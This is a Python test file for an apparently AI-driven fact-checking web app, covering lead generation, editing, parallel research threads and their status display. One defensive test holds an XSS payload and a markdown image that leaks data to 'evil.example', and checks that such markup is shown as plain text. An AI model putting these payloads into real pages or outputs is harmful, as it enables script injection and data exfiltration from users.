"""The smallest end-to-end path: paste text, get leads, edit them, press Go, watch threads."""

from nicegui import ElementFilter, ui
from nicegui.testing import User

from manyminds.core.errors import ModelError
from manyminds.core.models import ErrorKind, Report
from manyminds.core.services import Services
from support import RecordingModel, start_all, until

TEXT = "The bridge opened in 1932."


async def generate_leads(user: User, text: str = TEXT) -> None:
    await user.open("/")
    user.find(marker="composer").type(text)
    user.find("Generate leads").click()
    await user.should_see(marker="lead-list")


async def launch(user: User) -> None:
    await generate_leads(user)
    start_all(user)
    await user.should_see(marker="thread-row-0")


def only_check_id(services: Services) -> str:
    (check,) = services.store.list_checks()
    return check.id


async def test_home_offers_a_box_to_paste_text_into(user: User) -> None:
    await user.open("/")

    await user.should_see("What would you like to check?")
    await user.should_see(marker="composer")
    await user.should_see("Generate leads")


async def test_generating_leads_shows_the_check_and_its_editable_leads(
    user: User, model: RecordingModel
) -> None:
    await generate_leads(user, TEXT + " Prefer archives.")

    await user.should_see("Bridge claim")
    await user.should_see(TEXT + " Prefer archives.")
    for lead in ("Lead A", "Lead B", "Lead C"):
        await user.should_see(kind=ui.input, content=lead)
    await user.should_see(marker="go")
    # One box holds the text and whatever the user asks for; it is sent whole.
    assert model.decompose_calls[0]["text"] == TEXT + " Prefer archives."
    assert model.decompose_calls[0]["instructions"] == ""


async def test_there_is_one_box_and_no_separate_one_for_instructions(user: User) -> None:
    await user.open("/")

    await user.should_see(marker="composer")
    await user.should_not_see(marker="instructions")


async def test_generating_with_no_text_asks_for_some(user: User, model: RecordingModel) -> None:
    await user.open("/")

    user.find("Generate leads").click()

    await user.should_see("Paste some text first.")
    assert model.decompose_calls == []


async def test_failed_lead_generation_says_why_in_the_conversation_and_can_be_retried(
    user: User, model: RecordingModel, services: Services
) -> None:
    model.decompose_error = ModelError(ErrorKind.RATE_LIMIT, "Too many requests")
    await user.open("/")
    user.find(marker="composer").type(TEXT)

    user.find("Generate leads").click()

    await user.should_see(marker="user-message", content=TEXT)
    await user.should_see("Leads could not be generated: Too many requests")
    await user.should_not_see(marker="lead-list")
    assert len(services.store.list_checks()) == 1

    model.decompose_error = None
    user.find("Try again").click()

    await user.should_see(marker="lead-list")
    await user.should_not_see("Leads could not be generated: Too many requests")


async def test_there_are_no_checkboxes_in_the_lead_list(user: User) -> None:
    await generate_leads(user)

    with user:
        assert list(ElementFilter(kind=ui.checkbox)) == []


async def test_go_researches_every_lead_left_in_the_list(
    user: User, model: RecordingModel, services: Services
) -> None:
    await generate_leads(user)

    start_all(user)
    await user.should_see(marker="thread-row-0")
    await services.jobs.wait_until_idle()

    assert [call["lead"] for call in model.research_calls] == ["Lead A", "Lead B", "Lead C"]
    assert {call["model"] for call in model.research_calls} == {"vendor/research-model"}


async def test_an_edited_lead_is_researched_as_edited(
    user: User, model: RecordingModel, services: Services
) -> None:
    await generate_leads(user)

    with user.scope(marker="lead-row-1"):
        user.find(kind=ui.input).clear().type("Lead B, reworded")
    start_all(user)
    await user.should_see(marker="thread-row-0")
    await services.jobs.wait_until_idle()

    assert [call["lead"] for call in model.research_calls] == [
        "Lead A",
        "Lead B, reworded",
        "Lead C",
    ]


async def test_a_removed_lead_disappears_and_is_not_researched(
    user: User, model: RecordingModel, services: Services
) -> None:
    await generate_leads(user)

    with user.scope(marker="lead-row-1"):
        user.find(marker="remove-lead").click()
    await user.should_not_see("Lead B")
    start_all(user)
    await user.should_see(marker="thread-row-0")
    await services.jobs.wait_until_idle()

    assert [call["lead"] for call in model.research_calls] == ["Lead A", "Lead C"]


async def test_another_model_can_be_chosen(
    user: User, model: RecordingModel, services: Services
) -> None:
    await generate_leads(user)

    user.find(marker="model-picker").click()
    user.find("vendor/other-model").click()
    start_all(user)
    await user.should_see(marker="thread-row-0")
    await services.jobs.wait_until_idle()

    assert {call["model"] for call in model.research_calls} == {"vendor/other-model"}


async def test_threads_appear_with_live_status(
    user: User, model: RecordingModel, services: Services
) -> None:
    model.hold = True
    await launch(user)

    # Two of the three run at once; the third waits its turn.
    await until(lambda: model.active == 2)
    with user.scope(marker="thread-row-0"):
        await user.should_see("Lead A")
        await user.should_see("Working")
    with user.scope(marker="thread-row-2"):
        await user.should_see("Lead C")
        await user.should_see("Queued")

    model.release("Lead A")
    with user.scope(marker="thread-row-0"):
        await user.should_see("Finished")
    with user.scope(marker="thread-row-1"):
        await user.should_see("Working")

    model.release_all()
    for row in ("thread-row-1", "thread-row-2"):
        with user.scope(marker=row):
            await user.should_see("Finished")


async def test_one_failed_thread_leaves_the_others_untouched(
    user: User, model: RecordingModel
) -> None:
    model.failures = {"Lead B": ModelError(ErrorKind.PROVIDER, "Upstream error")}
    await launch(user)

    with user.scope(marker="thread-row-1"):
        await user.should_see("Failed")
    for row in ("thread-row-0", "thread-row-2"):
        with user.scope(marker=row):
            await user.should_see("Finished")


async def test_launched_leads_are_no_longer_offered_for_editing(user: User) -> None:
    await launch(user)

    await user.should_not_see(marker="go")
    await user.should_not_see(marker="lead-row-0")


async def test_a_finished_thread_can_be_read_while_another_is_still_working(
    user: User, model: RecordingModel
) -> None:
    model.hold = True
    await launch(user)
    model.release("Lead A")
    with user.scope(marker="thread-row-0"):
        await user.should_see("Finished")

    user.find(marker="thread-row-0").click()

    await user.should_see("Lead A")
    await user.should_see("Findings")
    await user.should_see(marker="findings", content="Findings about: Lead A")
    assert model.active == 2


async def test_a_source_in_the_findings_links_to_it_in_a_new_tab(
    user: User, model: RecordingModel
) -> None:
    model.reports["Lead A"] = Report(notes="One source: [Source](https://example.org/source)")
    await launch(user)
    with user.scope(marker="thread-row-0"):
        await user.should_see("Finished")
    user.find(marker="thread-row-0").click()
    await user.should_see("Findings")

    (link,) = user.find(kind=ui.link, content="Source").elements

    assert link.props["href"] == "https://example.org/source"
    assert link.props["target"] == "_blank"


async def test_a_working_thread_shows_progress_and_then_its_report(
    user: User, model: RecordingModel, services: Services
) -> None:
    model.hold = True
    await launch(user)
    await until(lambda: model.active >= 1)

    user.find(marker="thread-row-0").click()

    await user.should_see("Working")
    await user.should_see("Searching: query for Lead A")
    await user.should_not_see(marker="findings")

    model.release("Lead A")
    await user.should_see("Finished")
    await user.should_see("Findings about: Lead A")


async def test_a_failed_thread_says_what_went_wrong(user: User, model: RecordingModel) -> None:
    model.failures = {"Lead B": ModelError(ErrorKind.PROVIDER, "Upstream error")}
    await launch(user)
    with user.scope(marker="thread-row-1"):
        await user.should_see("Failed")

    user.find(marker="thread-row-1").click()

    await user.should_see("Lead B")
    await user.should_see("Failed")
    await user.should_see("Upstream error")
    await user.should_not_see(marker="findings")


async def test_markup_in_findings_is_shown_as_text_never_rendered(
    user: User, model: RecordingModel
) -> None:
    hostile = '<img src=x onerror="alert(1)"> ![x](https://evil.example/?leak=1)'
    model.reports["Lead A"] = Report(notes=hostile, unreturned_links=[hostile])
    await launch(user)
    with user.scope(marker="thread-row-0"):
        await user.should_see("Finished")
    user.find(marker="thread-row-0").click()
    await user.should_see("Findings")

    with user:
        assert list(ElementFilter(kind=ui.html)) == []
        assert list(ElementFilter(kind=ui.markdown)) == []
        assert list(ElementFilter(kind=ui.image)) == []
        showing = [
            label.text
            for label in ElementFilter(kind=ui.label)
            if '<img src=x onerror="alert(1)">' in label.text
        ]
    assert len(showing) == 2  # in the findings, and in the list of links not returned


async def test_the_thread_page_never_shows_a_verdict(user: User) -> None:
    await launch(user)
    with user.scope(marker="thread-row-0"):
        await user.should_see("Finished")
    user.find(marker="thread-row-0").click()
    await user.should_see("Findings")

    for word in ("Verdict", "Confidence", "True", "False", "Rating"):
        await user.should_not_see(word)


async def test_a_check_page_can_be_opened_directly_by_its_address(
    user: User, services: Services
) -> None:
    await launch(user)
    await services.jobs.wait_until_idle()

    await user.open(f"/check/{only_check_id(services)}")

    await user.should_see("Bridge claim")
    await user.should_see(marker="thread-row-0")
    with user.scope(marker="thread-row-0"):
        await user.should_see("Finished")


async def test_an_unknown_check_says_it_was_not_found(user: User) -> None:
    await user.open("/check/does-not-exist")

    await user.should_see("This check could not be found.")
